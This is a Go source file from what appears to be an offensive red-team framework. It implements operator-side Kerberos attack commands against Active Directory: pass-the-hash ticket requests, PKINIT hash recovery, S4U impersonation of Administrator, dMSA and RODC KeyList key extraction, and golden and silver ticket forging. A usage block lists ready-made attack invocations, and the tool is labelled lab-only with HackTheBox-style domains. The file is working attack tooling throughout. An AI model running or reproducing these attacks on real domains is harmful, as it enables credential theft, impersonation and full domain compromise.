package preimplant

import (
	"fmt"
	"strings"
	"time"

	"github.com/KKingZero/ARK/pkg/krb"
)

// RunKerberos is host-side (no teamserver): skew | with-skew.
func RunKerberos(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("%s", krbUsage)
	}
	switch args[0] {
	case "help", "-h", "--help":
		fmt.Print(krbUsage)
		return nil
	case "skew":
		return kerberosSkew(args[1:])
	case "with-skew":
		return kerberosWithSkew(args[1:])
	case "ticket":
		return kerberosTicket(args[1:])
	case "asktgt", "asreq":
		return kerberosAskTGT(args[1:])
	case "pkinit":
		return kerberosPKINIT(args[1:])
	case "s4u":
		return kerberosS4U(args[1:])
	case "keylist":
		return kerberosKeyList(args[1:])
	case "golden":
		return kerberosGolden(args[1:], false)
	case "silver":
		return kerberosGolden(args[1:], true)
	default:
		return fmt.Errorf("unknown kerberos command %q\n%s", args[0], krbUsage)
	}
}

const krbUsage = `ark kerberos — operator-host Kerberos (no implant)

  ark kerberos skew --dc H
  ark kerberos with-skew --dc H -- certipy auth -pfx admin.pfx -dc-ip H
  ark kerberos ticket import <kirbi|ccache>
  ark kerberos ticket list
  ark kerberos asktgt --dc H --domain D --user U --pass-file P
  ark kerberos asktgt --dc H --domain D --user U --hash NT   # overpass etype 23
  ark kerberos pkinit --pfx F --dc H --domain D --user U
  ark kerberos s4u --dc H --domain D --user ATTACK$ --pass-file P \
      --impersonate Administrator --spn cifs/dc.domain.htb [--altservice CIFS/other]
  ark kerberos s4u --dmsa --dc H --domain D --user ATTACKER --pass-file P \
      --impersonate dmsa$ [--spn krbtgt/DOMAIN]
  ark kerberos keylist --dc H --domain D --user Administrator --rodc-no N --aes-file KEY
  ark kerberos keylist --dc H --domain D --ticket ID
  ark kerberos golden --domain D --user Administrator --sid S-1-5-21-… --aes-file krbtgt.aes [--rid 500] [--kvno 2]
  ark kerberos silver --domain D --user Administrator --sid S-1-5-21-… --spn cifs/dc.d.htb --aes-file host.aes

AES TGT / S4U only (no RC4 passwords). AskTGT --hash is NT-hash overpass (RC4-HMAC).
PKINIT UnPAC returns the NT hash and a TGT ccache.
KeyList forges an RODC-kvno AES TGT then KERB-KEY-LIST for one NT hash (etype 23).
--ticket uses an existing TGT instead of forging.
Tickets land in ~/.ark/tickets (ARK_TICKET_DIR).
with-skew wraps a command in libfaketime. Lab-only.
`

func kerberosSkew(args []string) error {
	f, _ := ParseFlags(args)
	dc := first(f, "dc", "host")
	if dc == "" {
		return fmt.Errorf("--dc required")
	}
	printProxyHint()
	res, err := krb.CheckSkewVsDC(dc, first(f, "user"), first(f, "pass"), krb.DefaultMaxSkew)
	if err != nil {
		return err
	}
	fmt.Println(res.Summary())
	if !res.OK() {
		return fmt.Errorf("skew_delta=%s FAIL (asktgt/s4u apply this internally; faketime not required)", krb.FormatDelta(res.Delta))
	}
	return nil
}

func kerberosWithSkew(args []string) error {
	f, rest := ParseFlags(args)
	dc := first(f, "dc", "host")
	if dc == "" || len(rest) == 0 {
		return fmt.Errorf("usage: ark kerberos with-skew --dc H -- <command...>")
	}
	res, err := krb.CheckSkewVsDC(dc, first(f, "user"), first(f, "pass"), 24*time.Hour)
	if err != nil {
		return err
	}
	fmt.Println(res.Summary())
	return krb.RunWithSkew(res.Delta, rest)
}

func kerberosTicket(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: ark kerberos ticket import <file> | list")
	}
	switch args[0] {
	case "import":
		if len(args) < 2 {
			return fmt.Errorf("usage: ark kerberos ticket import <kirbi|ccache>")
		}
		m, err := krb.ImportTicket(args[1], "")
		if err != nil {
			return err
		}
		fmt.Printf("ok ticket id=%s principal=%s@%s server=%s etype=%d source=%s\n",
			m.ID, m.Principal, m.Realm, m.Server, m.EType, m.Source)
		fmt.Printf("ccache %s\n", m.CCache)
		return nil
	case "list":
		list, err := krb.ListTickets("")
		if err != nil {
			return err
		}
		if len(list) == 0 {
			fmt.Println("(no tickets)")
			return nil
		}
		for _, m := range list {
			fmt.Printf("%s  %s@%s  %s  etype=%d  %s\n", m.ID, m.Principal, m.Realm, m.Server, m.EType, m.Source)
		}
		return nil
	default:
		return fmt.Errorf("usage: ark kerberos ticket import <file> | list")
	}
}

func kerberosAskTGT(args []string) error {
	f, _ := ParseFlags(args)
	pass, err := readSecret(f, "pass", "pass-file")
	if err != nil {
		return err
	}
	printProxyHint()
	m, err := krb.AskTGT(krb.AskTGTOptions{
		Domain:   first(f, "domain"),
		Username: first(f, "user", "username"),
		Password: pass,
		Hash:     first(f, "hash", "ntlm-hash"),
		KDC:      first(f, "dc", "host", "kdc"),
	})
	if err != nil {
		return err
	}
	fmt.Printf("ok asktgt id=%s principal=%s@%s server=%s etype=%d skew_delta=%s\n",
		m.ID, m.Principal, m.Realm, m.Server, m.EType, krb.FormatDelta(krb.ClockOffset()))
	fmt.Printf("ccache %s\n", m.CCache)
	return nil
}

func kerberosPKINIT(args []string) error {
	f, _ := ParseFlags(args)
	printProxyHint()
	res, err := krb.PKINIT(krb.PKINITOptions{
		Domain:   first(f, "domain"),
		Username: first(f, "user", "username"),
		KDC:      first(f, "dc", "host", "kdc"),
		PFXPath:  first(f, "pfx", "out"),
		PFXPass:  first(f, "pfx-pass", "password"),
	})
	if err != nil {
		return err
	}
	fmt.Printf("ok pkinit nt=%s id=%s principal=%s@%s etype=%d skew_delta=%s\n",
		res.NTHash, res.Ticket.ID, res.Ticket.Principal, res.Ticket.Realm, res.Ticket.EType, krb.FormatDelta(krb.ClockOffset()))
	if res.Ticket.CCache != "" {
		fmt.Printf("ccache %s\n", res.Ticket.CCache)
	}
	return nil
}

func kerberosS4U(args []string) error {
	f, _ := ParseFlags(args)
	pass, err := readSecret(f, "pass", "pass-file")
	if err != nil {
		return err
	}
	printProxyHint()
	dmsa := flagBool(f, "dmsa")
	m, err := krb.S4U(krb.S4UOptions{
		Domain:      first(f, "domain"),
		Username:    first(f, "user", "username"),
		Password:    pass,
		KDC:         first(f, "dc", "host", "kdc"),
		Impersonate: first(f, "impersonate", "imp"),
		SPN:         first(f, "spn", "service"),
		AltService:  first(f, "altservice", "alt-service"),
		DMSA:        dmsa,
	})
	if err != nil {
		return err
	}
	if dmsa {
		if m.DMSAKeys == nil {
			return fmt.Errorf("s4u --dmsa: no KERB-DMSA-KEY-PACKAGE previous-keys")
		}
		fmt.Print(m.DMSAKeys.Dump())
	}
	fmt.Printf("ok s4u id=%s principal=%s@%s server=%s etype=%d skew_delta=%s\n",
		m.ID, m.Principal, m.Realm, m.Server, m.EType, krb.FormatDelta(krb.ClockOffset()))
	fmt.Printf("ccache %s\n", m.CCache)
	return nil
}

func kerberosKeyList(args []string) error {
	f, _ := ParseFlags(args)
	aes, err := readSecret(f, "aes", "aes-file")
	if err != nil {
		return err
	}
	var rodc uint32
	if s := first(f, "rodc-no", "rodc"); s != "" {
		var n uint64
		_, _ = fmt.Sscanf(s, "%d", &n)
		rodc = uint32(n)
	}
	printProxyHint()
	res, err := krb.KeyList(krb.KeyListOptions{
		RODCNumber: rodc,
		AESKeyHex:  aes,
		User:       first(f, "user", "impersonate"),
		Domain:     first(f, "domain"),
		KDC:        first(f, "dc", "host", "kdc"),
		Ticket:     first(f, "ticket", "ccache"),
	})
	if err != nil {
		return err
	}
	fmt.Printf("ok keylist user=%s kvno=%d nt=%s etype=%d ticket=%s\n",
		res.User, res.KVNO, res.NTHash, res.EType, res.Ticket.ID)
	if res.Ticket.CCache != "" {
		fmt.Printf("ccache %s\n", res.Ticket.CCache)
	}
	return nil
}

func kerberosGolden(args []string, silver bool) error {
	f, _ := ParseFlags(args)
	aes, err := readSecret(f, "aes", "aes-file")
	if err != nil {
		return err
	}
	opts := krb.ForgeOptions{
		Domain:    first(f, "domain"),
		User:      first(f, "user", "username"),
		SID:       first(f, "sid", "domain-sid"),
		AESKeyHex: aes,
		SPN:       first(f, "spn", "service"),
	}
	if silver && opts.SPN == "" {
		return fmt.Errorf("silver: --spn required")
	}
	if s := first(f, "rid"); s != "" {
		var n uint64
		_, _ = fmt.Sscanf(s, "%d", &n)
		opts.RID = uint32(n)
	}
	if s := first(f, "kvno"); s != "" {
		fmt.Sscanf(s, "%d", &opts.KVNO)
	}
	if g := first(f, "groups"); g != "" {
		for _, p := range strings.Split(g, ",") {
			var n uint64
			if _, err := fmt.Sscanf(strings.TrimSpace(p), "%d", &n); err == nil && n > 0 {
				opts.Groups = append(opts.Groups, uint32(n))
			}
		}
	}
	m, err := krb.ForgeTicket(opts)
	if err != nil {
		return err
	}
	fmt.Printf("ok %s id=%s principal=%s@%s server=%s etype=%d\n",
		m.Source, m.ID, m.Principal, m.Realm, m.Server, m.EType)
	fmt.Printf("ccache %s\n", m.CCache)
	return nil
}
